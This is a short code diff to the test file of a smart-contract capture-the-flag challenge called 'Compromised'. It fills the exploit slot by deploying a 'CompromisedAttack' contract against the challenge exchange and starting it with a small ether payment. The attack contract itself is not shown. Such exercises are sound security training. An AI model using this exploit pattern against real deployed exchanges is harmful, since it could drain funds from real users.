@@ -61,6 +61,9 @@ describe('Compromised challenge', function () {
 
     it('Exploit', async function () {        
         /** CODE YOUR EXPLOIT HERE */
+        const CompromisedAttackFactory = await ethers.getContractFactory('CompromisedAttack', attacker);
+        this.compromisedAttack = await CompromisedAttackFactory.connect(attacker).deploy(this.exchange.address);
+        await this.compromisedAttack.start({ value: ethers.utils.parseEther('0.01') });
     });
 
     after(async function () {
